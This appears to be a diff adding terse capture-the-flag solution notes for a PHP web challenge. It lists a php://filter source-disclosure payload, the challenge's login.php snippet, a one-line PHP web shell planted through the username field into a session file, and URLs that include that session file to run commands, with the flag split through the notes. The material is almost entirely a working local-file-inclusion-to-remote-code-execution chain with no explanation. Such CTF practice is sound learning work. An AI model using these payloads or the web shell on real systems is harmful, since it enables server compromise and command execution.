@@ -1,0 +1,20 @@
+php://filter/read=convert.base64-encode/resource=index.php
+
+FLAG{c0py_th15
+
+php://filter/read=convert.base64-encode/resource=login.php
+
+<?php
+session_start();
+if(isset($_POST['username'])) {
+    $_SESSION['username'] = $_POST['username'];
+    header("Location: /");
+}
+
+<?php system($_GET["a"]) ?>
+
+https://copygen.splitline.tw/?tpl=/tmp/sess_30aafb2ab8d5a506dcd236c0e15bff1d
+https://copygen.splitline.tw/?tpl=/tmp/sess_30aafb2ab8d5a506dcd236c0e15bff1d&a=ls
+https://copygen.splitline.tw/?tpl=/tmp/sess_30aafb2ab8d5a506dcd236c0e15bff1d&a=ls%20/
+
+_fl4g_4nd_subm1t}
